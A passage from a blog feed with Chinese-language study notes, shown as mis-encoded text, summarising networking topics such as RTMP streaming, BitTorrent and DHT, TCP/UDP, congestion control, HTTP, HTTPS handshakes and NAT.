    <content type="html"><![CDATA[<h3 id="æµåª’ä½“åè®®"><a href="#æµåª’ä½“åè®®" class="headerlink" title="æµåª’ä½“åè®®"></a>æµåª’ä½“åè®®</h3><p>è§†é¢‘æœ‰å®¢æˆ·ç«¯ä¸Šä¼ è‡³æœåŠ¡å™¨åœ¨ç”±å¦ä¸€å®¢æˆ·ç«¯ä¸‹è½½æ’­æ”¾çš„æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼šå®¢æˆ·ç«¯ï¼ˆé‡‡æ ·ã€ç¼–ç ã€æ¨æµï¼‰-æœåŠ¡å™¨ï¼ˆæ¥æµã€æµå¤„ç†ã€åˆ†å‘ï¼‰-å®¢æˆ·ç«¯ï¼ˆæ‹‰æµã€è§£ç ã€æ’­æ”¾ï¼‰<br>è§†é¢‘ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œæ•°æ®é‡è¿‡å¤§ï¼Œéœ€è¦è¿›è¡Œå‹ç¼©å¤„ç†ï¼›å¸¸ç”¨çš„å¯¹è§†é¢‘æµä¸­å›¾ç‰‡çš„å‹ç¼©æ–¹æ³•æœ‰1ã€ç©ºé—´å†—ä½™ï¼›2ã€æ—¶é—´å†—ä½™ï¼›3ã€è§†è§‰å†—ä½™ï¼›4ã€ç¼–ç å†—ä½™ã€‚<br>å®Œæ•´çš„è§†é¢‘æµç”±å¾ˆå¤šå¸§å›¾ç‰‡ç»„æˆï¼Œæ¯ä¸€å¸§åˆåˆ†æˆå¤šä¸ªç‰‡ï¼Œæ¯ä¸ªç‰‡çš„ä¿¡æ¯éƒ½ä½¿ç”¨ä¸€ä¸ªç½‘ç»œæå–å±‚å•å…ƒï¼ˆNALUï¼‰ä¿å­˜ï¼Œæœ€ç»ˆç»„æˆä¸€ä¸ªNALUåºåˆ—ï¼Œä¸ºä¼ è¾“åšå‡†å¤‡<br>æ’åˆ—å¥½çš„äºŒè¿›åˆ¶æµéœ€è¦ä½¿ç”¨åŸºäºTCPçš„RTMPåè®®è¿›è¡Œåˆ†å—ä¼ è¾“<br>å½“è§†é¢‘æµæ¨é€åˆ°å®¢æˆ·ç«¯æ—¶ï¼Œå®¢æˆ·ç«¯å†é€šè¿‡RTMPåè®®æ‹‰å–æ•°æ®ï¼Œè¯»å–chunkä¸­çš„messageï¼Œç»„åˆä¸ºNALUåºåˆ—ï¼Œå†è§£ç æˆè§†é¢‘æ ¼å¼æ’­æ”¾</p><h3 id="P2Påè®®"><a href="#P2Påè®®" class="headerlink" title="P2Påè®®"></a>P2Påè®®</h3><p>ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶æœ‰HTTPå’ŒFTPä¸¤ç§æ–¹å¼ï¼Œä½†è¿™ä¸¤ç§éƒ½æ˜¯é›†ä¸­ä¸‹è½½çš„æ–¹å¼ï¼Œè€Œ P2P åˆ™æ¢äº†ä¸€ç§æ€è·¯ï¼Œé‡‡å–éä¸­å¿ƒåŒ–ä¸‹è½½çš„æ–¹å¼ï¼›<br>P2P ä¸¤ç§ï¼Œä¸€ç§æ˜¯ä¾èµ–äº tracker çš„ï¼Œä¹Ÿå³å…ƒæ•°æ®é›†ä¸­ï¼Œæ–‡ä»¶æ•°æ®åˆ†æ•£ï¼›å¦ä¸€ç§æ˜¯åŸº<br>äºåˆ†å¸ƒå¼çš„å“ˆå¸Œç®—æ³•ï¼Œå…ƒæ•°æ®å’Œæ–‡ä»¶æ•°æ®å…¨éƒ¨åˆ†æ•£ã€‚<br>ä¾èµ–tracker ï¼š<br>ä¸‹è½½æ—¶ï¼ŒBT å®¢æˆ·ç«¯é¦–å…ˆè§£æ.torrent æ–‡ä»¶å¾—åˆ° tracker åœ°å€ï¼Œå†ç”± tracker æœåŠ¡å™¨å°†å…¶ä»–ä¸‹è½½è€…ï¼ˆåŒ…æ‹¬å‘å¸ƒè€…ï¼‰çš„ IP æä¾›ç»™ä¸‹è½½è€…ã€‚ä¸‹è½½è€…å†è¿æ¥å…¶ä»–ä¸‹è½½è€…ï¼Œæ ¹æ®.torrent æ–‡ä»¶ï¼Œä¸¤è€…åˆ†åˆ«å¯¹æ–¹å‘ŠçŸ¥è‡ªå·±å·²ç»æœ‰çš„å—ï¼Œç„¶åäº¤æ¢å¯¹æ–¹æ²¡æœ‰çš„æ•°æ®ã€‚æ­¤æ—¶ä¸éœ€è¦å…¶ä»–æœåŠ¡å™¨å‚ä¸ï¼Œå¹¶åˆ†æ•£äº†å•ä¸ªçº¿è·¯ä¸Šçš„æ•°æ®æµé‡ï¼Œå› æ­¤å‡è½»äº†æœåŠ¡å™¨çš„è´Ÿæ‹…ã€‚</p><h3 id="å»ä¸­å¿ƒåŒ–ç½‘ç»œï¼ˆDHTï¼‰ï¼š"><a href="#å»ä¸­å¿ƒåŒ–ç½‘ç»œï¼ˆDHTï¼‰ï¼š" class="headerlink" title="å»ä¸­å¿ƒåŒ–ç½‘ç»œï¼ˆDHTï¼‰ï¼š"></a>å»ä¸­å¿ƒåŒ–ç½‘ç»œï¼ˆDHTï¼‰ï¼š</h3><p>Kademlia åè®®æ˜¯è‘—åçš„DHTåè®®ï¼Œåœ¨ DHT ç½‘ç»œé‡Œé¢ï¼Œæ¯ä¸€ä¸ª DHT node éƒ½æœ‰ä¸€ä¸ª IDã€‚è¿™ä¸ª ID æ˜¯ä¸€ä¸ªå¾ˆé•¿çš„ä¸²ã€‚æ¯ä¸ª DHT node éƒ½æœ‰è´£ä»»æŒæ¡ä¸€äº›çŸ¥è¯†ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶ç´¢å¼•ï¼Œæ¯ä¸ª DHT node ä½¿ç”¨å“ˆå¸Œç®—æ³•è®¡ç®—å‡ºéœ€è¦ä¿å­˜çš„æ–‡ä»¶ç´¢å¼•ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>æµåª’ä½“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š10-13è®²</title>
    <link href="/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A10-13%E8%AE%B2/"/>
    <url>/2020/10/31/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A10-13%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<p>æ€»ç»“/æ€è€ƒï¼š<br>UDPåè®®<br>UDPåè®®çš„é¦–éƒ¨æœ‰8ä¸ªå­—èŠ‚ï¼Œä¸€å…±å››ä¸ªå­—æ®µï¼Œæ¯ä¸ªå­—æ®µçš„é•¿åº¦éƒ½æ˜¯2ä¸ªå­—èŠ‚ï¼Œ16æ¯”ç‰¹ï¼ˆä½ï¼‰ã€‚<br>UDP ç‰¹ç‚¹<br>1ã€æ— è¿æ¥ï¼šUDPæ˜¯æ— è¿æ¥çš„åè®®ï¼Œä»–åœ¨è¿›è¡Œæ•°æ®ä¼ è¾“ä¹‹å‰ä¸éœ€è¦å…ˆå»ºç«‹è¿æ¥ï¼Œä¹Ÿæ²¡æœ‰å„ç§é‡ä¼ æœºåˆ¶ã€æ‹¥å¡æ§åˆ¶å’Œæµé‡æ§åˆ¶ï¼Œæ‰€ä»¥ä¼ è¾“é€Ÿåº¦å¾ˆå¿«ï¼Œæ¶ˆè€—å¾ˆä½ï¼Œå»¶è¿Ÿå°ï¼Œæ•°æ®ä¼ è¾“æ•ˆç‡é«˜ï¼Œé€‚åˆå¯¹å¯é æ€§è¦æ±‚ä¸é«˜çš„åº”ç”¨ç¨‹åºï¼Œæˆ–è€…å¯ä»¥ä¿éšœå¯é æ€§çš„åº”ç”¨ç¨‹åºï¼Œå¦‚DNSã€TFTPã€SNMPç­‰ã€‚<br>2ã€ä¸å¯é ï¼šåªè´Ÿè´£æ•°æ®çš„å‘é€ï¼Œä¸å…³å¿ƒæ•°æ®æ˜¯å¦é€è¾¾ï¼Œæ²¡æœ‰ç¡®è®¤æœºåˆ¶ï¼Œä¸»æœºæ”¶åˆ°æ•°æ®ä¹Ÿä¸ä¼šæœ‰å“åº”<br>3ã€åˆ†ç»„é¦–éƒ¨å¼€é”€å°ï¼ŒTCPçš„é¦–éƒ¨æ˜¯20å­—èŠ‚ï¼ŒUDPçš„é¦–éƒ¨æ˜¯8å­—èŠ‚<br>4ã€é¢å‘æŠ¥æ–‡çš„ï¼šTCP(é¢å‘è¿æ¥çš„ä¼ è¾“æ§åˆ¶åè®®)æ˜¯é¢å‘å­—èŠ‚ä¼ è¾“ï¼Œè€ŒUDPæ˜¯é¢å‘æŠ¥æ–‡ä¼ è¾“ï¼Œå¯¹äºåº”ç”¨å±‚äº¤ä¸‹æ¥çš„æŠ¥æ–‡æ®µä¸è¿›è¡Œæ‹†åˆ†åˆå¹¶ï¼Œç›´æ¥ä¿ç•™åŸæœ‰æŠ¥æ–‡æ®µçš„è¾¹ç•Œç„¶åæ·»åŠ UDPçš„é¦–éƒ¨å°±äº¤ä»˜ç»™ç½‘ç»œå±‚ã€‚ä¸è®ºæŠ¥æ–‡çš„é•¿çŸ­ï¼ŒUDPéƒ½ä¸ä¼šè¿›è¡Œå¤„ç†ã€‚å› æ­¤ä¸ºäº†é¿å…æŠ¥æ–‡æ®µè¿‡çŸ­é™ä½ä¼ è¾“æ•ˆç‡ä»¥åŠæŠ¥æ–‡æ®µè¿‡é•¿å¯¼è‡´ç½‘ç»œå±‚å¯¹IPæ•°æ®è¿›è¡Œåˆ†ç‰‡æ“ä½œï¼Œåº”ç”¨å±‚åº”è¯¥é€‰æ‹©åˆé€‚é•¿åº¦çš„æŠ¥æ–‡äº¤ä»˜ç»™è¿è¾“å±‚çš„UDPã€‚</p><p>TCPåè®®<br>TCP ç”¨äºä»åº”ç”¨ç¨‹åºåˆ°ç½‘ç»œçš„æ•°æ®ä¼ è¾“æ§åˆ¶ã€‚<br>TCP è´Ÿè´£åœ¨æ•°æ®ä¼ é€ä¹‹å‰å°†å®ƒä»¬åˆ†å‰²ä¸º IP åŒ…ï¼Œç„¶ååœ¨å®ƒä»¬åˆ°è¾¾çš„æ—¶å€™å°†å®ƒä»¬é‡ç»„ã€‚<br>æ˜¯é¢å‘è¿æ¥çš„ã€å¯é çš„ã€åŸºäºå­—èŠ‚æµçš„ä¼ è¾“å±‚é€šä¿¡åè®®ã€‚<br>TCP ç‰¹ç‚¹<br>1ã€ç‚¹å¯¹ç‚¹ï¼ˆä¸èƒ½å¹¿æ’­ã€å¤šæ’­ï¼‰ï¼Œé¢å‘è¿æ¥<br>2ã€åŒå‘ä¼ é€’ï¼ˆå…¨åŒå·¥ï¼‰<br>3ã€å­—èŠ‚æµï¼šæ‰“åŒ…æˆæŠ¥æ–‡æ®µã€ä¿è¯æœ‰åºæ¥æ”¶ã€é‡å¤æŠ¥æ–‡è‡ªåŠ¨ä¸¢å¼ƒ<br>     ç¼ºç‚¹ï¼šä¸ç»´æŠ¤åº”ç”¨æŠ¥æ–‡çš„è¾¹ç•Œï¼ˆéœ€è¦HTTPåè®®è‡ªå·±å®šä¹‰/r/næˆ–content lengthè¿›è¡Œç»“å°¾ã€GRPCï¼‰<br>     ä¼˜ç‚¹ï¼šä¸å¼ºåˆ¶è¦æ±‚åº”ç”¨å¿…é¡»ç¦»æ•£çš„åˆ›å»ºæ•°æ®å—ï¼Œä¸é™åˆ¶æ•°æ®å—å¤§å°<br>4ã€æµé‡ç¼“å­˜ï¼šè§£å†³é€Ÿåº¦ä¸åŒ¹é…é—®é¢˜ï¼ˆæ»‘åŠ¨çª—å£ï¼‰<br>5ã€å¯é çš„ä¼ è¾“æœåŠ¡ï¼ˆä¿è¯å¯è¾¾ï¼Œä¸¢åŒ…æ—¶é€šè¿‡é‡å‘è¿›è€Œå¢åŠ æ—¶å»¶å®ç°å¯é æ€§ï¼‰<br>6ã€æ‹¥å¡æ§åˆ¶</p><p>MSSï¼šMax Segment Size<br>å®šä¹‰ï¼šä»…æŒ‡TCPæ‰¿è½½æ•°æ®ï¼Œä¸åŒ…å«TCPå¤´éƒ¨å¤§å°ï¼Œå‚è§RFC879<br>MSSé€‰æ‹©ç›®çš„ï¼š<br>å°½é‡æ¯ä¸ªSegmentæŠ¥æ–‡æ®µæºå¸¦æ›´å¤šçš„æ•°æ®ï¼Œä»¥å‡å°‘å¤´éƒ¨ç©ºé—´å ç”¨æ¯”ç‡<br>é˜²æ­¢Segmentè¢«æŸä¸ªè®¾å¤‡çš„IPå±‚åŸºäºMTUæ‹†åˆ†<br>é»˜è®¤MSSï¼š536å­—èŠ‚ï¼ˆæ ‡å‡†é»˜è®¤MTU576å­—èŠ‚ï¼Œ20å­—èŠ‚IPå¤´éƒ¨ï¼Œ20å­—èŠ‚TCpå¤´éƒ¨ï¼‰</p><p>æ»‘åŠ¨çª—å£<br>æ˜¯TCPæµé‡æ§åˆ¶çš„ä¸€ä¸ªæ‰‹æ®µã€‚è¿™é‡Œè¯´çš„çª—å£ï¼ŒæŒ‡çš„æ˜¯æ¥æ”¶é€šå‘Šçª—å£ï¼ˆReceiver Windowï¼ŒRWNDï¼‰ã€‚å®ƒå‘Šè¯‰å¯¹æ–¹æœ¬ç«¯çš„TCPæ¥æ”¶ç¼“å†²åŒºè¿˜èƒ½å®¹çº³å¤šå°‘å­—èŠ‚çš„æ•°æ®ï¼Œè¿™æ ·å¯¹æ–¹å°±å¯ä»¥æ§åˆ¶å‘é€æ•°æ®çš„é€Ÿåº¦ã€‚</p><p>æ‹¥å¡æ§åˆ¶<br>æ‹¥å¡æ§åˆ¶åŒ…å«å››ä¸ªæ–¹å¼ï¼šæ…¢å¯åŠ¨ã€æ‹¥å¡é¿å…ã€å¿«é€Ÿé‡ä¼ å’Œå¿«é€Ÿæ¢å¤ï¼Œç”¨äºåº”å¯¹é€šä¿¡ç½‘ç»œç¯å¢ƒå·®æ—¶çš„ä¸¢åŒ…é—®é¢˜<br>ä¸¢åŒ…æƒ…å†µä¸¥é‡æ—¶é‡‡ç”¨æ…¢å¯åŠ¨+æ‹¥å¡é¿å…æ–¹å¼ï¼›å½“ä¸¢åŒ…æƒ…å†µä¸ä¸¥é‡æ—¶ï¼Œå¯è¿›è¡Œå¿«é€Ÿé‡ä¼ å’Œå¿«é€Ÿæ¢å¤æ–¹å¼ï¼›ä¸ä¸€å®šä¼šè¿›å…¥æ…¢å¯åŠ¨çŠ¶æ€.</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š14-15è®²</title>
    <link href="/2020/09/26/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A14-15%E8%AE%B2/"/>
    <url>/2020/09/26/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A14-15%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="HTTPè¯·æ±‚æ ¼å¼"><a href="#HTTPè¯·æ±‚æ ¼å¼" class="headerlink" title="HTTPè¯·æ±‚æ ¼å¼"></a>HTTPè¯·æ±‚æ ¼å¼</h3><p>HTTPçš„æŠ¥æ–‡ä¸»è¦åˆ†ä¸º1ã€è¯·æ±‚è¡Œï¼›2ã€è¯·æ±‚é¦–éƒ¨ï¼›3ã€è¯·æ±‚ä½“</p><h4 id="è¯·æ±‚è¡Œ"><a href="#è¯·æ±‚è¡Œ" class="headerlink" title="è¯·æ±‚è¡Œ"></a>è¯·æ±‚è¡Œ</h4><p>HTTPè¯·æ±‚è¡Œä¸­åŒ…å«è¯·æ±‚æ–¹æ³•ï¼ˆGETã€POSTã€PATCHç­‰ï¼‰ã€URLã€å’ŒHTTPç‰ˆæœ¬</p><h4 id="é¦–éƒ¨å­—æ®µ"><a href="#é¦–éƒ¨å­—æ®µ" class="headerlink" title="é¦–éƒ¨å­—æ®µ"></a>é¦–éƒ¨å­—æ®µ</h4><p>é¦–éƒ¨å­—æ®µç”¨Kï¼šVæ–¹å¼è¡¨ç¤ºï¼›å¦‚æˆ‘ä»¬è¯·æ±‚ä¸€ä¸ªç½‘ç«™ï¼ŒæœåŠ¡å™¨ç»™æˆ‘ä»¬è¿”å›ç­‰åº”ç­”ä¸­å¤´éƒ¨å­—æ®µï¼›å®¢æˆ·ç«¯åŒæ ·å¯ä»¥æ„é€ <br>è¯·æ±‚å¤´éƒ¨å­—æ®µ<br>accept-ranges: bytes<br>access-control-allow-origin: *<br>age: 3035367<br>cache-control: max-age=31536000<br>content-length: 8035<br>content-type: image/png</p><h4 id="è¯·æ±‚ä½“"><a href="#è¯·æ±‚ä½“" class="headerlink" title="è¯·æ±‚ä½“"></a>è¯·æ±‚ä½“</h4><p>è¯·æ±‚ç­‰å®ä½“å†…å®¹</p><h3 id="HTTPè¿”å›æ ¼å¼"><a href="#HTTPè¿”å›æ ¼å¼" class="headerlink" title="HTTPè¿”å›æ ¼å¼"></a>HTTPè¿”å›æ ¼å¼</h3><p>HTTPå“åº”æŠ¥æ–‡ä¸»è¦åŒ…æ‹¬1ã€çŠ¶æ€è¡Œï¼›2ã€é¦–éƒ¨ï¼›3ã€å“åº”å®ä½“</p><h4 id="çŠ¶æ€è¡Œ"><a href="#çŠ¶æ€è¡Œ" class="headerlink" title="çŠ¶æ€è¡Œ"></a>çŠ¶æ€è¡Œ</h4><p>çŠ¶æ€è¡ŒåŒ…æ‹¬HTTPç‰ˆæœ¬ã€çŠ¶æ€ç ã€å’Œæè¿°å“åº”ç»“æœç­‰çŸ­è¯­ï¼Œå¦‚â€œokâ€</p><h4 id="é¦–éƒ¨å’Œå“åº”å®ä½“"><a href="#é¦–éƒ¨å’Œå“åº”å®ä½“" class="headerlink" title="é¦–éƒ¨å’Œå“åº”å®ä½“"></a>é¦–éƒ¨å’Œå“åº”å®ä½“</h4><p>é¦–éƒ¨å’Œå“åº”å®ä½“ä¸è¯·æ±‚æŠ¥æ–‡æ„ä¹‰ä¸€æ ·</p><h3 id="QUICåè®®"><a href="#QUICåè®®" class="headerlink" title="QUICåè®®"></a>QUICåè®®</h3><p>QUIC åè®®é€šè¿‡åŸºäº UDP è‡ªå®šä¹‰çš„ç±»ä¼¼ TCP çš„è¿æ¥ã€é‡è¯•ã€å¤šè·¯å¤ç”¨ã€æµé‡æ§åˆ¶æŠ€æœ¯ï¼Œè¿›<br>ä¸€æ­¥æå‡æ€§èƒ½ã€‚</p><h3 id="HTTP-åŠ å¯†ä¼ è¾“"><a href="#HTTP-åŠ å¯†ä¼ è¾“" class="headerlink" title="HTTP åŠ å¯†ä¼ è¾“"></a>HTTP åŠ å¯†ä¼ è¾“</h3><p>HTTPåœ¨ç½‘ç»œä¸­æ˜¯ä»¥æ˜æ–‡æ–¹å¼ä¼ è¾“ç­‰ï¼Œå­˜åœ¨ä¸­é—´äººæ”»å‡»ç­‰å®‰å…¨éšæ‚£ï¼Œä¸ºç¡®ä¿å®‰å…¨éœ€è¦é‡‡ç”¨åŠ å¯†ä¼ è¾“ï¼Œç›®å‰åŠ å¯†æ–¹å¼åˆ†ä¸ºå¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†ä¸¤ç§</p><h4 id="å¯¹ç§°åŠ å¯†"><a href="#å¯¹ç§°åŠ å¯†" class="headerlink" title="å¯¹ç§°åŠ å¯†"></a>å¯¹ç§°åŠ å¯†</h4><p>å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥åŠ è§£å¯†æ•°æ®ï¼Œä½†æ˜¯å¯†é’¥ç­‰ä¼ è¾“ä¸€èˆ¬åªèƒ½é€šè¿‡çº¿ä¸‹ä¼ è¾“ï¼Œåœ¨å®¢æˆ·ç«¯å¤šç­‰æƒ…å†µä¸‹ï¼Œä¸€å¯¹ä¸€ä¸ºå®¢æˆ·ç«¯æä¾›å¯†é’¥å°±ä¸å¤ªå®é™…<br>####éå¯¹ç§°åŠ å¯†<br>å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½æœ‰å„è‡ªç­‰å…¬é’¥å’Œç§é’¥ã€‚åŒæ—¶å®¢æˆ·ç«¯æä¾›è‡ªå·±ç­‰å…¬é’¥ç»™æœåŠ¡ç«¯ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å‘å½¼æ­¤å‘é€æ•°æ®æ—¶ï¼Œéƒ½æ˜¯ä½¿ç”¨å¯¹æ–¹ç­‰å…¬é’¥è¿›è¡ŒåŠ å¯†ï¼Œè¿™æ ·å°±åªæœ‰å¯¹æ–¹æ‰å…·å¤‡ç§é’¥è§£å¯†æ•°æ®ã€‚é‡‡ç”¨å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯æä¾›å…¬é’¥çš„æ–¹å¼å¯ä»¥è§£å†³å¯†é’¥ä¼ è¾“çš„é—®é¢˜</p><h3 id="æ•°å­—è¯ä¹¦"><a href="#æ•°å­—è¯ä¹¦" class="headerlink" title="æ•°å­—è¯ä¹¦"></a>æ•°å­—è¯ä¹¦</h3><p>ç”±æƒå¨æœºæ„å¯¹å…¬é’¥è¿›è¡Œè®¤è¯ï¼Œé¢å‘è¯ä¹¦ï¼Œè¯ä¹¦ä¸€èˆ¬åŒ…å«å…¬é’¥ã€è¯ä¹¦æ‰€æœ‰è€…ä¿¡æ¯ã€è¯ä¹¦å‘å¸ƒæœºæ„å’Œè¯ä¹¦æœ‰æ•ˆæœŸç­‰ä¿¡æ¯ï¼Œç”¨äºåŠ å¼ºå…¬é’¥ç­‰å¯ä¿¡åº¦ã€‚</p><h3 id="HTTPSå·¥ä½œæ–¹å¼"><a href="#HTTPSå·¥ä½œæ–¹å¼" class="headerlink" title="HTTPSå·¥ä½œæ–¹å¼"></a>HTTPSå·¥ä½œæ–¹å¼</h3><p>å»ºç«‹HTTPSè¿æ¥æ—¶ï¼š<br>1ã€å®¢æˆ·ç«¯ï¼šä»¥æ˜æ–‡ä¼ è¾“ TLS ç‰ˆæœ¬ä¿¡æ¯ã€åŠ å¯†å¥—ä»¶å€™é€‰åˆ—è¡¨ã€å‹ç¼©ç®—æ³•å€™é€‰åˆ—è¡¨ç­‰ä¿¡æ¯å’Œä¸€ä¸ªéšæœºæ•°ï¼ˆåœ¨åå•†å¯¹ç§°å¯†é’¥çš„æ—¶å€™ä½¿ç”¨ï¼‰ç»™æœåŠ¡ç«¯<br>2ã€æœåŠ¡ç«¯ï¼šå‘å®¢æˆ·ç«¯å‘é€æœåŠ¡å™¨é€‰æ‹©ä½¿ç”¨çš„åè®®ç‰ˆæœ¬ã€åŠ å¯†å¥—ä»¶ã€å‹ç¼©ç®—æ³•ç­‰å’Œä¸€ä¸ªéšæœºæ•°ï¼ˆç”¨äºåç»­çš„å¯†é’¥åå•†ï¼‰;ä»¥åŠæœåŠ¡ç«¯çš„è¯ä¹¦<br>3ã€å®¢æˆ·ç«¯ï¼šéªŒè¯æœåŠ¡ç«¯è¯ä¹¦ï¼ŒéªŒè¯è¯ä¹¦å¯ä¿¡åï¼Œå®¢æˆ·ç«¯è®¡ç®—äº§ç”Ÿéšæœºæ•°å­— Pre-masterï¼Œå‘é€ Client Key Exchangeï¼Œç”¨è¯ä¹¦ä¸­çš„å…¬é’¥åŠ å¯†ï¼Œå†å‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å¯ä»¥é€šè¿‡ç§é’¥è§£å¯†<br>å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡å™¨ï¼Œéƒ½æœ‰äº†ä¸‰ä¸ªéšæœºæ•°ï¼Œåˆ†åˆ«æ˜¯ï¼šè‡ªå·±çš„ã€å¯¹ç«¯çš„ï¼Œä»¥åŠåˆšç”Ÿæˆçš„ Pre-Master éšæœºæ•°ã€‚é€šè¿‡è¿™ä¸‰ä¸ªéšæœºæ•°ï¼Œå¯ä»¥åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨äº§ç”Ÿç›¸åŒçš„å¯¹ç§°å¯†é’¥ã€‚<br>åç»­çš„æ•°æ®ä¼ è¾“ä¾¿ä½¿ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†<br>HTTPSé‡‡ç”¨éå¯¹ç§°åŠ å¯†çš„æ–¹å¼ä¼ è¾“å¯†é’¥ï¼Œå¯¹ç§°åŠ å¯†çš„æ–¹å¼ä¼ è¾“æ•°æ®ï¼Œè§£å†³äº†å¯†é’¥ä¼ è¾“çš„å®‰å…¨é—®é¢˜ï¼ŒåŒæ—¶ä¹Ÿæé«˜äº†æ•°æ®ä¼ è¾“çš„æ•ˆç‡ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>HTTP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š5-9è®²</title>
    <link href="/2020/09/06/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A5-9%E8%AE%B2/"/>
    <url>/2020/09/06/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A5-9%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="æ€»ç»“-æ€è€ƒï¼š"><a href="#æ€»ç»“-æ€è€ƒï¼š" class="headerlink" title="æ€»ç»“/æ€è€ƒï¼š"></a>æ€»ç»“/æ€è€ƒï¼š</h3><p>ç¬¬8è®²ä¸­å…³äºNATçš„æ˜ å°„è®²çš„æ¯”è¾ƒæ¨¡ç³Šï¼Œæ²¡æœ‰è®²æ˜ä»å…¬ç½‘è®¿é—®è¿‡æ¥çš„åŒ…æ€ä¹ˆå‡†ç¡®çš„NATåˆ°å¯¹åº”çš„å†…å¤–IPä¸Šï¼Œè‡ªè¡Œgoogleäº†NATçš„åŸç†ï¼Œåšä¸‹æ€»ç»“ï¼š</p><h3 id="NATï¼ˆIP-Network-Address-Translatorï¼‰"><a href="#NATï¼ˆIP-Network-Address-Translatorï¼‰" class="headerlink" title="NATï¼ˆIP Network Address Translatorï¼‰"></a>NATï¼ˆIP Network Address Translatorï¼‰</h3><h4 id="NATæŠ€æœ¯ä½¿ç”¨åŸå› å’Œåœºæ™¯"><a href="#NATæŠ€æœ¯ä½¿ç”¨åŸå› å’Œåœºæ™¯" class="headerlink" title="NATæŠ€æœ¯ä½¿ç”¨åŸå› å’Œåœºæ™¯"></a>NATæŠ€æœ¯ä½¿ç”¨åŸå› å’Œåœºæ™¯</h4><p>åŸå› ï¼šå…¬åŠ¡IPæ•°é‡å°‘ï¼Œä¸»æœºæ•°é‡å¤šï¼Œæ— æ³•ç»™æ¯ä¸ªä¸»æœºéƒ½åˆ†é…ä¸€ä¸ªå…¬ç½‘IPï¼Œå› æ­¤å°±éœ€è¦å¤šå°å†…ç½‘ä¸»æœºå…±äº«ä¸€ä¸ªå…¬ç½‘IPã€‚<br>ä½¿ç”¨åœºæ™¯ï¼š<br>1ï¼‰å†…ç½‘ä¸­ä¸»è¦ç”¨äºå®¢æˆ·ç«¯è®¿é—®äº’è”ç½‘<br>2ï¼‰åŒä¸€æ—¶é—´ä»…å°‘é‡ä¸»æœºè®¿é—®äº’è”ç½‘<br>3ï¼‰å†…ç½‘ä¸­å­˜åœ¨ä¸€ä¸ªè·¯ç”±å™¨è´Ÿè´£è®¿é—®å¤–ç½‘</p><h4 id="å•å‘ï¼ˆå‘å¤–ï¼‰è½¬æ¢NATï¼šåŠ¨æ€æ˜ å°„"><a href="#å•å‘ï¼ˆå‘å¤–ï¼‰è½¬æ¢NATï¼šåŠ¨æ€æ˜ å°„" class="headerlink" title="å•å‘ï¼ˆå‘å¤–ï¼‰è½¬æ¢NATï¼šåŠ¨æ€æ˜ å°„"></a>å•å‘ï¼ˆå‘å¤–ï¼‰è½¬æ¢NATï¼šåŠ¨æ€æ˜ å°„</h4><p>åŒä¸€æ—¶é—´å†…ä»…æœ‰å°‘é‡ä¸»æœºå¯è®¿é—®å…¬ç½‘ï¼Œè·¯ç”±å™¨ä¸ºè¿™äº›å†…ç½‘ä¸»æœºä¸´æ—¶é…ç½®1å¯¹1çš„å…¬ç½‘IP-å†…ç½‘IPæ˜ 